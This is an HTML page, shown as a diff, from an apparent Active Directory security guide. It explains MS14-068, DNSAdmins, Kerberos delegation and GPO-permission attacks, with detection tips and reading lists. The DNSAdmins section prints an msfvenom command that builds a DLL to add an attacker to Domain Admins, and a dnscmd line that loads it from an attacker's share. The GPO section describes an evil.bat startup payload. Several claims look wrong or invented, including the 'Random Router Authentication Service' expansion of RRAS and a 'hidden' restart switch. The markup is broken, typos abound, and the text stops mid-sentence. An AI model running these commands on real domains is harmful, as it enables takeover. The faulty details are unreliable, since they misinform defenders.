+<li><a href="https://app.tidalcyber.com/references/538def90-5de4-4b8c-b535-0e2570ba1841">Finding Passwords in SYSVOL & Exploiting Group Policy</a></li>
+<li><a href="https://podalirius.net/en/active-directory/exploiting-windows-group-policy-preferences/">Exploiting Windows Group Policy Preferences</a></li>
+<li><a href="https://www.pearsonitcertification.com/articles/article.aspx?p=2952620&seqNum=2">Exploiting Local Host and Physical Security Vulnerabilities</a></li>
+<li><a href="https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/">Pentesting in the Real World: Group Policy Pwnage</a></li>
+</ul>
+</article>
+</section>
+
+<section id="ms14-068">
+<h3>A Brief Examination of the MS14-068 Kerberos Vulnerability</h3>
+<article>
+<p>MS14-068 is a design flaw in the Windows Kerberos Key Distribution Center (KDC) that allows any authenticated domain user to forge a <em>Privilege Attribute Certificate (PAC)</em> and mint a Domain-Admin-equivalent ticket without knowing the <code>krbtgt</code> account password. The bug exists becacuse the KDC accepted non-keyed checksums, such as MD5, to validate the PAC signature; an attacker could therefore craft a PAC that claims membership in Enterprise Admins, Schema Admins, Domain Admins, sign it with a trivial hash, and embed it in a TGT. When the KDC processed the ticket it skipped the cryptographic proof and trusted the forged privileges, issuing a new TGT that effectively impersonated the highest authority in the AD forest.</p>
+<p>Exploitation is embarrassingly straightforward:</p>
+<p>1. Ask for a PAC-less TGT by setting <code>PA-PAC-REQUEST = false</code> in the AS-REQ.</p>
+<p>2. BUild a fake PAC containing the desired groups and sign it with MD5.</p>
+<p>3. Send a <code>TGS-REQ</code> for the <code>krbtgt</code> service (e.g., request another TGT) and inject the forged PAC encrypted with the session key obtained in Step 1.</p>
+<p>4. The vulnerable KDC validates the MD5 "signature," embeds the PAC in the reply, and returns a Golden-Ticket-equivalent TGT-no <code>krbtgt</code> hash required.</p>
+<p>The resulting ticket is functionally identifcal to a Golden Ticket: it never expires until the default lifetime (</p>10 h by default), works against any service, and bypasses normal delegation checks. Because the attack is pure Kerberos, no malware touches disk and no lateral movement is needed; a single RPC call from a domain-joined workstation is just enough to seize full control of every domain-joined host, including the controllers themselves.</p>
+<p>Microsoft released MS14-068 in November 2014 (CVE-2014-6324) and acknowledged limited targeted attacks in the wild. The patch forces strict signature verfication and validation and rejects any PAC that is not signed with the KDCs secret key, effectively killing the primitive on updated controllers. Defenders still running Server 2008 / 2008 R2 without the update remain exposed; any standard user-helpdesk, kiosk, or meeting-room account-can escalate to Domain Admins in seconds. Hunt for the exploit by looking for Event ID 4768 where the Account Name is a normal user but the PAC validation fails (Event ID 38 post-patch), or by correlating quick <code>AS-REQ >> TGS-REQ >> TGT-for-KRBTGT</code> sequences that occur within a few milliseconds of each other.</p>    
+<ul>
+<li><a href="https://adsecurity.org/?p=525">MS14-068: Vulnerability in (Active Directory) Kerberos Could Allow Elevation of Privilege</a></li>
+<li><a href="https://labs.mwrinfosecurity.com/blog/digging-into-ms14-068-exploitation-and-defence/">Digging Into MS14-068, Exploitation and Defense</a></li>
+<li><a href="https://www.trustedsec.com/2014/12/ms14-068-full-compromise-step-step/">From MS14-068 to Full Compromise - Step by Step</a></li>
+<li><a href="https://safecomputing.umich.edu/security-alerts/microsoft-windows-critical-kdc-privilege-escalation-vulnerability-ms14-068-cve-2014">Microsoft Windows Critical KDC Privilege Escalation</a></li>
+<li><a href="https://adsecurity.org/?p=541">Kerberos Vulnerability in MS14-068 (KB3011780) Explained</a></li>
+</ul>
+</article>
+</section>
+
+<section id="dnsadmins">
+<h3>DNSAdmins in Active Directory</h3>
+<article>
+<p>DNSAdmins is not just another "network helpers" group-it is a stealth path to <code>SYSTEM</code> on the Domain Controller, and from there to full forest compromise. Membership grants control of the Microsoft DNS Server services, which on most Active Directory networks runs on the same box as the DC. Because the service loads code at intitial runtime,anyone who has the ability to edit its configuration can make it execute most any type of malicious action (e.g., injecting a malicious DLL) in to the <code>NT AUTHORITY\SYSTEM</code> context with no exploit or memory corruption required.</p>
+<h4>1. What The Group Really Pwns</h4>
+<p>By default DNSAdmins is created when the DNS server role in installed and configured. Its members automatically receive:</p>
+<ul>
+<li><strong>Write</strong> permission on the <code>CN=MicrosoftDNS,CN=System,DC= ...</code> container in AD.</li>
+<li><strong>RPC administrative</strong> access to th DNS server (via <code>dnscmd</code>, WMI, or <code><em>RRAS (Random Router Authentication Service)</em> calls.</li>
+<li>Authority to set the undocumented registry key and hive value <code>HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDLL</code></li>
+</ul>
+<p>The last bullet is the weapon: the DNS service will <code>LoadLibrary()</code> any path placed in that value when it starts (at runtime), running inside its own privileged process.</p>
+<h4>2. Classic Excalation Chain</h4>
+<p>1. Attacker (or compromised helpdesk account) is added to DNSAdmins.</p>
+<p>2. Generate a DLL that adds a user to "Domain Admins" or shells home:</p>
+<p><code># Using Metaspoloit's msfvenom
+msfvenom -p windows\x64\exec
+cmd='net group "Domain Admins"
+attacker /add' -f dll -o pwn.dll</code></p>
+<p>3. Host the DLL on an attacker-controlled UNC share with SMB signing disabled, proxied, or relayed.</p>
+<p>4. Point the DNS service at it: <code>dnscmd dc01.corp.local /config \serverlevelplugindll\\10.0.0.5\share\pwn.dll</code></p>
+<p>5. Force the service to reload.</p>
+<ul>
+<li>Older blogs stop here and say "wait for reboot;" that is no longer necessary.</li>
+<li>Simply issue:</li>
+<p><code>dnscmd dc01.corp.local /config /Restart # hidden switch, works since 2012 R2</code></p>
+<p>The DNS process performs an internal reload; the DLL is then loaded instantly without generating an Event ID 7045 (Service Creation Events).</p>
+<p>6. Code runs as <code>SYSTEM</code> on the DC; add yourself to DA, dump LSASS, or establish persistence.</p>
+<h4>3. Stealthier Variant-Container ACL-Only</h4>
+<p>Research online has proven that you do not even need to be in DNSAdmins if you can obtain <strong>Write</strong> permissions on the MicrosoftDNS container and RPC connect to the DC-both of which are frequently delegated to network teams. A user created with those minimal rights flies under most radars because container ACLs are rarely reviewed. From there the same <code>/config/serverlevelplugindll</code> and <code>/Restart</code> commands work exactly the same way.</p>
+<h4>4. Detection & Hardening</h4>
+<ul>
+<li><strong>Audit membership:</strong>treat DNSAdmins as Tier 0; include it on AdminSDHolder or at least review it quarterly.</li>
+<li><strong>Monitor registry:</strong>alert on any change to <code>HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll</code></li>.
+<li><strong>Monitor process creation</strong> under dns.exe - legitimate DLLs are rare.</li>
+<li><strong>Block RPC from user VLANs</strong> to DCs except from hardened admin jump hosts.</li>
+<li><strong>Disable the plug-in</strong> capability if unused: <code>reg add "HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters" /v DisableServerLevelPluginDll /t REG_DWORD /d 1</code></li>
+<li><strong>Patch:</strong>CVE-2021-40469 added a check that only Enterprise Admins or Builtin\Administrators can set the plug-in path; apply the October 2021 rollup and keep DNS servers fully patched.</li>
+<p>Remember: the DNS service runs as <code>SYSTEM</code>, loads code on demand, and is managed by a group that is not protected by AdminSDHolder by default. Secure DNSAdmins as fiercely as you secure Domain Admins-because in practice they are the same thing.</p>
+<ul>
+<li><a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html">Abusing DNSAdmins Privilege for Escalation in Active Directory</a></li>
+<li><a href="https://adsecurity.org/?p=4064">From DNSAdmins to Domain Admin, When DNSAdmins is More Than Just DNS Administration</a></li>
+<li><a href="https://medium.com/@harikrishnanp006/dnsadmins-abuse-aa3d76ed664">Introduction DNSAdmins Abuse</a></li>
+<li><a href="https://medium.com/r3d-buck3t/escalating-privileges-with-dnsadmins-group-active-directory-6f7adbc7005b">Escalating Privileges with DNSAdmins Group</a></li>
+<li><a href="https://phackt.com/dnsadmins-group-exploitation-write-permissions">Why DnsAdmins Privilege Escalation Is Still Working</a></li>
+<li><a href="https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/">Windows Privilege Escalation: DnsAdmins to Domain Admin</a></li>
+<li><a href="https://gracker.ai/cybersecurity-tools/lab-of-a-penetration-tester-abusing-dnsadmins-privilege-for-escalation-in-active-directory">Lab of a Penetration Tester: Abusing DNSAdmins Privilege for Escalation in Active Directory</a></li>
+<li><a href="https://learn.microsoft.com/en-us/defender-for-identity/unsafe-permissions-dns-admins-group">Unsafe Permissions on the DnsAdmins Group</a></li>
+</ul>  
+</article>
+</section>
+
+<section id="kerberos">
+<h3>Kerberos Delegation in Active Directory</h3>
+<article>
+<p>Kerberos delegation is Windows' built-in mechanism that lets a service reuse a client's identity to access a second service on that client's behalf. Done right it enables seamless n-tier applications; done wrong it hands attackers a universal impersonation primitive. Understanding the three flavors-<strong>unconstrained, constrained</strong>, and <strong>Resource-Based Constrained Delegation (RBCD)</strong>-is essential for both red and blue teams of ethical hackers.
+<h4>1. Unconstrained Delegation (Historical Default)</h4>
+<ul>
+<p><li><strong>Setting:</strong>"Trust this computer for delegation to any service (Kerberos only)"</li></p>
+<p><li><strong>Mechanics:</strong>When a user authenticates to the frontned of the service it also receives a forwardable TGT for that user. It can then present the TGT to any backend service in the forest-or in any trusted forest, for that matter.</li></p>
+<p><li><strong>Risk:</strong>If the frontend server is compromised the attacker can harvest every TGT that hits it and can move laterally as those users, including Domain Admins. The compromise surface is total: CIFS, LDAP, MSSQL, HTTP, RPC-whatever the attacker chooses.</li></p>
+<p><li><strong>Discovery:</strong></li></p>
+<per>
+Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+Get-ADUser -Filter {TrustedForDelegation -eq $true}
+</per>
+<p><li><strong>Mitigation:</strong>Treat any object with this flag as <strong>Tier 0;</strong>disable the setting wherever and whenever possible and migrate to <strong>constrained delegation</strong>instead.</li>
+</ul>
+<h4>2. Constrained Delegation (S4U2Proxy)</h4>
+<p>Introduced in Windows Server 2003 to curb impacts of unconstrained delegation attacks</p>
+<ul>
+<p><li><strong>Setting:</strong>"Trust this computer for delegation to specified services only >> Kerberos only.</li></p>
+<p><li><strong>Mechanics:</strong>The KDC honors a <em>service-for-user-to-proxy</em>(S4U2Proxy) request only if the frontend's <code>msDS-AllowedToDelegateTo</code>attribute contains the <strong>exact SPN of the backend service. No TGT is cached; the frontend receives a service ticket scoped to the nominated SPNs.</li></p>
+<p><li><strong>Configuration Rights:</strong>Requres domain admin (or delegated) rights to write the <code>msDS-AllowedToDelegateTo</code>list.</li></p>
+<p><li><strong>Attack Pathway:</strong>If the list contains a sensitive SPN (e.g., <code>LDAP/DC01.corp.local</code>) and the frontend is owned, the attacker can S4U2Self (protocol transition) to obtain a ticket for any user and then S4U2Proxy to the DC, effectively becoming that user.</li></p>
+<p><li><strong>Hardening</strong></li></p>
+<ul><li>Keep SPN lists minimal; never point to domain controller services from middle-tiered hosts.</li>
+<li>Enabled "Kerberos only" so the frontend must first receive a real Kerberos service ticket; this blocks NTLM >> Kerberos elevation.</li>
+<li>Use dedicated, single-purpose service accounts; do not reuse the same account for multiple delegation pathways.</li></ul></ul>
+<h4>3. Resource-Based Constrained Delegation (RBCD)-Server 2012+</h4>
+<p>Shifts the trust decision from the delegating account to the resource.</p>
+<p><li><strong>Setting:</strong>Backend resource holds <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>= security descriptor listing which frontends may delegate to it.</li></p>
+<p><li><strong>Cross-Domain Capable:</strong>Frontend can live in a different domain or forest; the resource owner decides who to trust.</li></p>
+<p><li><strong>Attack Surface:</strong>If an attacker gains write permissions over the resource's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>attribute (common on computer accounts or gMSAs) they can insert a SID under their control and perform S4U2Self + S4U2Proxy to impersonate any user to that resource. This is the primitive behind <strong>Shadow Credentials, <code>sAMAccountName</code>spoofing,</strong>and <strong>BadSuccessor</strong>chains.</li></p>
+<ul>
+<li><strong>Defense:</strong></li>
+<ul>
+<li>Protect ACLs on computer objects and service accounts exactly like Domain Admins.</li>
+<li>Audit changes to <code>msDS-AllowedToActOnBehalfOfOtherIdentity;</code>legitimate RBCD edits are rare and should require change-control approval beforehand.</li>
+<li>Prefer <strong>group-Managed Service Accounts (gMSA)</strong>for delegation pathways; their automatic password rotation shrinks the window of exposure if a ticket is stolen.</li>
+</ul>
+</ul>
+<h4>4. Practical Lock Down Summary</h4>
+<ul><li><strong>Inventory:</strong>Export all accounts with any delegation bit set (<code>TrustedForDelegation, msDS-AllowedToDelegateTo, msDS-AllowedToActOnBehalfOfOtherIdentity</code>).</li>
+<li><strong>Minimize:</strong>Replace unconstrained with constrained; replace constrained with RBCD only when cross-domain is required.</li>
+<li><strong>Isolate:</strong>Place delegating hosts in separate OUs with their ACLs; delegate <code><strong>CreateChild</strong></code>only to Tier 0 administrators.</li>
+<li><strong>Flag Protection:</strong>Enabled "Account is sensitive and cannot be delegated" on Domain Admins, <code>krbtgt</code>, service accounts, and Tier - operators.</li>
+<li><strong>Monitoring:</strong>Alert on <strong>Event ID 4769</strong>where Transited Services is non-empty (indicates delgation has occurred) and source account is <strong>unexpected.</strong></li>
+<li><strong>Advanced:</strong>Deploy Protected Users, Credential Guard and LSA Protection on frontend servers to block ticket extraction attacks even if they are indeed compromised.</li></ul>
+<p>Kerberos delegation is not broken - it is simply powerful by design. Treat ever delegating account as a potential Domain Controller and you will quickly shrink your attack surface from forest-wide to business-justified SPN pairs.</p>
+
+<h4>Kerberos Delegation Types</h4>
+<ul>
+<li><a href="https://shenaniganslabs.io/media/Constructing%20Kerberos%20Attacks%20with%20Delegation%20Primitives.pdf">Constructing Kerberos Attacks with Delegation Primitives</a></li>
+<li><a href="http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html">No Shells Required - A Walkthrough on Using Impacket and Kerberos to Delegate Your Way to DA</a></li>
+<li><a href="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-overview/">CVE-2020-17049: Kerberos Bronze Bit Attack - Overview</a></li>
+<li><a href="https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/">Delegating Like a Boss: Abusing Kerberos Delegation</a></li>
+<li><a href="https://labs.lares.com/fear-kerberos-pt4/">Kerberos IV - Delegations</a></li>
+<li><a href="https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61">Kerberos Killed the Domain: An Offensive Kerberos Overview</a></li>
+<li><a href="https://www.trimarcsecurity.com/hub-post/active-directory-security-risk-101-kerberos-unconstrained-delegation-or-how-compromise-of-a-singl-1">How to Compromise Kerberos Delegation</a></li>
+<li><a href="https://isc.sans.edu/diary/31488">Credential Guard and Kerberos Delegation</a></li>
+</ul>
+  
+<h4>Kerberos<strong><em>Unconstrained Delegation</em></strong>Articles of Interest</h4>
+<ul><li><a href="https://adsecurity.org/?p=4056">Domain Controller Print Server + Unconstrained Kerberos Delegation = Pwned Active Directory Forest</a></li>
+<li><a href="https://adsecurity.org/?p=1667">Active Directory Security Risk #101: Kerberos Unconstrained Delegation (or How to Compromise a Single Server and How It Can Compromise the Entire Domain</a></li>
+<li><a href="https://blog.stealthbits.com/unconstrained-delegation-permissions/">Unconstrained Delegation Permissions</a></li>
+<li><a href="https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/">Trust? Years to Earn, Seconds to Break</a></li>
+<li><a href="https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1">Hunting in Active Directory: Unconstrained Delegation & Forest Trusts</a></li>
+<li><a href="https://www.riccardoancarani.it/exploiting-unconstrained-delegation/">Exploiting Unconstrained Delegation in Active Directory</a></li>
+<li><a href="https://medium.com/r3d-buck3t/attacking-kerberos-unconstrained-delegation-ef77e1fb7203">Attacking Kerberos Unconstrained Delegation</a></li>
+<li><a href="https://blog.sentry.security/domain-takeover-via-kerberos-unconstrained-delegation/">Domain Takeover via Kerberos Unconstrained Delegation</a></li>
+<li><a href="https://docs.axway.com/bundle/axway-open-docs/page/docs/apigtw_kerberos/kerberos_use_case_ucd/index.html">Kerberos Unconstrained Delegation: Abusing API Credentials to API Gateways</a></li>
+<li><a href="https://marklewis.blog/2019/12/20/remove-unconstrained-kerberos-delegation/">Remove Unconstrained Kerberos Delegation</a></li>
+<li><a href="https://attl4s.github.io/assets/pdf/You_do_(not)_Understand_Kerberos_Delegation.pdf">You Do (Not) Understand Kerberos Unconstrained Delegation</a></li>
+<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation">Red Team Notes: Kerberos Unconstrained Delegation</a></li>
+<li><a href="https://www-aisp-sg.webpkgcache.com/doc/-/s/www.aisp.sg/document/CRESTConSpeaker/Delegate_or_Escalate.pdf">Delegate or Escalate? The Dangers of Kerberos Delegation</a></li></ul>
+  
+<h4>Kerberos<strong><em>Constrained Delegation</em></strong>Articles of Interest</h4>
+<ul><li><a href="https://blog.harmj0y.net/redteaming/another-word-on-delegation/">Another Word on Delegation</a></li>
+<li><a href="https://blog.harmj0y.net/redteaming/from-kekeo-to-rubeus/">From Kekeo to Rubeus</a></li>
+<li><a href="https://blog.harmj0y.net/activedirectory/s4u2pwnage/">S4U2Pwnage</a></li>
+<li><a href="https://www.secureauth.com/blog/kerberos-delegation-spns-and-more">Kerberos Delegation, SPNs, and More</a></li>
+<li><a href="https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview">Kerberos Constrained Delegation Overview</a></li>
+<li><a href="https://practical365.com/kerberos-constrained-delegations-crossing-security-boundaries/">Kerberos Constrained Delegations-Crossing AD Security Boundaries</a></li>
+<li><a href="https://www.notsoshant.io/blog/attacking-kerberos-constrained-delegation/">Attacking Kerberos: Constrained Delegation</a></li>
+<li><a href="http://www.patrickkeisler.com/2022/02/setup-constrained-delegation-for-group-managed-service-accounts/">Setup Kerberos Constrained Delegation for Group-Managed Service Accounts (gMSA)</a></li>
+<li><a href="https://my.f5.com/manage/s/article/K17976428">K17976428: Overview of Kerberos Constrained Delegation</a></li>
+<li><a href="https://jumpcloud.com/it-index/what-is-kerberos-constrained-delegation-kcd">What is Kerberos Constrained Delegation (KCD)?</a></li>
+<li><a href="https://docs.aws.amazon.com/whitepapers/latest/access-workspaces-with-access-cards/enable-kerberos-constrained-delegation-for-the-ad-connector-service-account.html">Enable Kerberos Constrained Delegation for the AD Connector Service Account in AWS</a></li>
+<li><a href="https://community.progress.com/s/article/How-to-troubleshoot-Kerberos-Constrained-Delegation-ESP-with-an-SSO-Debug-trace">How to Troubleshoot Kerberos Constrained Delegation ESP with an SSO Device</a></li>
+
+<h4>Kerberos<strong><em>Resource-Based Constrained Delegation (RBCD)</em></strong></h4>
+<ul><li><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">Kerberos Resource-Based Constrained Delegation: Computer Object Take Over</a></li></li>
+<li><a href="https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/">Kerberos (III): How Does RBCD Work?</a></li>
+<li><a href="https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/">Resource-Based Constrained Delegation Abuse</a></li>
+<li><a href="https://www.crowe.com/insights/crowe-cyber-watch/constrained-delegation-resource-based-delegation-outsmart-attacks">Constrained Delegation and Resource-Based Delegation</a></li>
+<li><a href="https://www.semperis.com/blog/ad-security-101-resource-based-constraint-delegation/">Resource-Based Constrained Delegation: AD Security 101</a></li>
+<li><a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">Wagging the Dog: Abusing Resource-Based Constrained Delegation</a></li>
+<li><a href="https://medium.com/@harikrishnanp006/resource-based-constrained-delegation-enhancing-access-control-in-active-directory-cdb0ce2b7e2">Resource-Based Constrained Delegation: Enhancing Access Controls in Active Directory</a></li>
+<li><a href="https://www.r-tec.net/r-tec-blog-resource-based-constrained-delegation.html">Resource-Based Constrained Delegation Attack Techniques</a></li>
+<li><a href="https://raxis.com/blog/ad-series-resource-based-constrained-delegation-rbcd/">AD Series: Resource-Based Constrained Delegation (RBCD)</a></li></ul>
+</ul>  
+</article>
+</section>
+
+<section id="insecure-gpo">
+<h3>Insecure Group Policy Object (GPO) Permission Rights</h3>
+<article>
+<p>Insecure Group Policy Object (GPO) permission rights are one of the quietest, yet most reliable, privilege escalation pathways inside an Active Directory forest. A GPO is a little more than a bundle of security settings, but because those settings are pushed to every single account that falls inside the policy's scope and domain purview, anyone who can edit the bundle effectively gains <em>temporary Domain Admin</em>authority over every machine or user the policy touches. The danger is compounded by the fact that GPO permissions are rarely reviewed after deployment; once an adminnstrator delegates "a bit of helpdesk access" to a policy, the delegation often lingers for years, surviving static turnover, mergers, and security audits alike.</p>
+<p>The heart of the problem lies in two separate permission layers that must both be secured. First, there is the Active Directory object that represents the GPO itself (<code>CN={GUID},CN=Policies,CN=System,DC= ...</code>). If an identity holds <strong>Write, Modify,</strong>or <strong>Owner</strong>rights on that object, it can change every setting the policy contains - password policies, firewall rules, software-installation packages, logon scripts, registry keys and hives, or even local group memberships.</p>
+<p>Second, there is the <code><strong>SYSVOL</strong></code>share, where the actual template files (<code>gpt.ini, Registry.pol,</code>scripts, MSI packages) are stored. Anyone with <strong>Write</strong>or <strong>Modify</strong>rights inside the <code>\\domain.com\SYSVOL\domain.com\Policies\{GUID}</code>folder can overwrite those files directly, bypassing the Group Policy Management Console (GPMC) and evading most Change Control processes. Because <code>SYSVOL</code>replicates to every Domain Controller, a single malicoius edit is instantly forest-wide.</p>
+<p>Attackers discovery these weak links with almost little to no effort at all. A one-liner such as <code>Get-GPO -All | Get-GPPermissions -TargetName "Authentiated Users" -TargetType Group</code>will list every GPO that grants carte blanche (blanket / "clear" access); replacing "Authenticated Users" with a compromised account name that quickly reveals the applied policy the attacker can weaponize. Once write access is confirmed, the payload can be introduced in several ways. The simplest way is to drop a new startup script in <code>\Machine\Scripts\Startup\evil.bat</code>; every computer that applies this GPO will execute the batch file as <code>SYSTEM</code>on its next reboot.</p>
+<p>A more subtler approach is to edit the <code>Registry.pol</code>file to push a new local Administrator account or to modify the Restricted Groups section so that the current user is silently added to "Domain Admins." Beause Group Policy has a default refresh and apply rate of evern 90 minutes (for computers), and every 16 hours (for users), the change propagates without any human intervention and without tripping moset antivirus engines-I mean, <em>>after all</em>, the operating system itself <em>is</em> applying the "configuration" as it is originally intended to do.</p>
+<p>Even when organizations believe they have fully locked down the GPO object, they sometimes forget the <code>SYSVOL</code>folder. Helpdesk technicians granted "modify scripts" rights on a specific directory can still overwrite files inside that directory's GPT folder; printer administrators who receive write access to a GPO that installs printer drivers can replace the driver package with a tainted MSI. The mismatch is easy to miss because the Group Policy Managment Console only shows the AD permissions mask, not the underlying NTFS ACLs. A quick sanity check with <code>icacls \\domain.com\SYSVOL\domain.com\Policies\{GUID}\* /save report.txt</code>will reveal whether extra accounts have been granted write access, yet few enterprises ever run that command, surprisingly (yet unfortunate).</p>
+<p>Remediation is straightforward once the exposure has been mapped: remove unnecessary ACEs, replace individual user rights with Role-Based groups, and enforce the rule that only Tier 0 administrators may posses Write or Owner rights on any production GPO. Microsoft's own baseline recommends adding the GPO object to AdminSDHolder protection so that membership changes are audited and privileged-group safeguard apply.</p>
+<p>Finally, turn on Advancecd Audit Policy logging for Directory Service Changes and Object Access; Event ID 5136 will capture every modification to a GPO object, while Event ID 4663 will record edits to the underlying <code>SYSVOL</code>files. With those logs forwarded to a SIEM and a quarterly review script that flags any delegation drift, insecure GPO permission rights stop being a hidden backdoor and become a visible, measurable part of the organization's security posture.</p>
+</article>
+</section>
+
+<section id="insecure-gpo-resources">
+<h2>Insecure Group Policy Object Resources</h2>
+<ul><li>Abusing GPO Permissions</li>
+<li>A Red Teamer's Guide to GPOs and OUs</li>
+<li>File Templates for GPO Abuse</li>
+<li>GPO Abuse - Part 1</li>
+<lo>GPO Abuse - Part 2</lo>
+<li>SharpGPOAbuse</li>
+<li>Insecure GPOs: A Guide to Avoiding Common Security Risks in Active Directory</li>
+<li><a href="https://blog.netwrix.com/2023/04/14/exploiting-weak-active-directory-permissions/">Exploiting Weak Active Directory Permissions via AD GPO</a></li>
+<li>GPOddity: Exploiting Active Directory GPOs Through NTLM Relaying</li>
+<li><a href=:https://www.silverfort.com/blog/exploiting-weaknesses-in-entra-id-account-synchronization-to-compromise-the-on-prem-environment/">Exploiting Weaknesses in Entra ID Accounts</a></li>
+<li><a href="https://notes.qazeer.io/active-directory/exploitation-acl_exploiting">Exploitation: ACL Exploiting</a></li></ul>
+
+<h3>Insecure ACL Permission Rights</h3>
+
+
+<h2>Miscellaneous Articles of Interest</h2>
+<ul><li><a href="https://synacktiv.com/en/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory">OUned.py: Exploiting Hiddent Organizational Units ACL Attack Vectors in Active Directory</a></li>
+<li><a href="https://echeloncyber.com/intelligence/entry/exploiting-the-active-directory-machine-account-quota-maq-rbcd-privilege-escalation-and-backdoor-account-creation">Exploiting the Active Directory Machine Account Quota (MAQ) for RBCD Privilege Escalation and Backdoor Account Creation</a></li>
+<li><a href="https://www.pearsonitcertification.com/articles/article.aspx?p=2952620&seqNum=2">Exploiting Local Host and Physical Security Vulnerabilities</a></li>
+<li><a href="https://www.cyberark.com/resources/threat-research-blog/follow-the-link-exploiting-symbolic-links-with-ease">Follow the Link: Exploiting Symbolic Links with Ease</a></li>
+<li><a href="https://www.semperis.com/blog/exploiting-app-only-graph-permissions-in-entra-id/">Exploiting <code>App-Only</code>Graph Permissions in Entra ID</a></li>
+<li><a href="https://medium.com/@aslam.mahimkar/exploiting-ad-dacl-writeowner-misconfiguration-ca61fb2fcee1">Exploiting <code>WriteOwner</code>Misconfigurations in Active Directory</a></li>
+<li><a href="https://adsecurity.org/?p=2288">Finding Passwords in <code>SYSVOL</code>& Exploiting Group Policy Objects</a></li>
+<li><a href="https://www.researchgate.net/publication/371901005_Exploiting_Misconfiguration_Vulnerabilities_in_Microsoft's_Azure_Active_Directory_for_Privilege_Escalation_Attacks">Exploiting Misconfiguration Vulnerabilities in Microsoft's Azure Active Directory (AAD)</a></li>
+<li><a href="https://redfoxsec.com/blog/exploiting-active-directory-certificate-services-ad-cs/">Exploiting Active Directory Certificate Services (AD CS)</a></li>
+<li><a href="https://www.semperis.com/blog/exploiting-certificate-based-authentication-in-entra-id/">Exploiting Certifiate-Based Authentiation in Entra ID</a></li>
+<li><a href="https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/">Exploiting Delegated Managed Service Accounts in Active Directory</a></li>
+</ul>  
+</section>
+
+<section id="insecureacl">
+<h3>Insecure ACL Permission Rights</h3>
+<article>
+<p>Insecure ACLs-those</p>
+</article>
+</main>
 </body>
 <!-- partial -->
   
 </body>
 </html>
+
+  
